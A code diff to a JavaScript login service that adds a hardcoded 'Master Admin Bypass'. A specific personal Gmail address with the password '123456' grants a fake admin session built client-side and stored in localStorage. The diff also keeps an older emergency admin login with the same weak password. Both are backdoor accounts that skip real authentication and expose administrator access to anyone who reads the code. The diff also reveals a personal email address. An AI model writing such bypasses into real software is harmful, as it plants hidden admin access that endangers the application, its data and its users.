@@ -198,16 +198,40 @@ const authService = {
 
     login: async (email, password) => {
         // === EMERGENCY ACCESS BYPASS ===
+        const cleanEmail = email.toLowerCase().trim();
+
+        // 1. Master Admin Bypass
+        if (cleanEmail === 'leivinjesus57@gmail.com' && password === '123456') {
+            const fakeUser = {
+                id: 'MASTER-ADMIN-BYPASS',
+                email: 'leivinjesus57@gmail.com',
+                name: 'Leivin (Super Admin)',
+                role: 'admin',
+                approved: true
+            };
+            authService.user = fakeUser;
+            localStorage.setItem('emergency_user', JSON.stringify(fakeUser));
+
+            await Swal.fire({
+                icon: 'success',
+                title: 'Modo Deus Ativado ⚡',
+                text: 'Entrando como Super Admin...',
+                timer: 1500,
+                showConfirmButton: false
+            });
+            window.location.href = "admin.html";
+            return true;
+        }
+
+        // 2. Legacy Emergency
         if (email === 'admin@marcaviva.com' && password === '123456') {
             const fakeUser = {
-                id: '00000000-0000-0000-0000-000000000001', // UUID válido para admin de emergência
+                id: '00000000-0000-0000-0000-000000000001',
                 email: 'admin@marcaviva.com',
                 name: 'Administrador de Emergência',
                 role: 'admin'
             };
             authService.user = fakeUser;
-
-            // Persist simple session
             localStorage.setItem('emergency_user', JSON.stringify(fakeUser));
 
             authService.notifyStateChange();
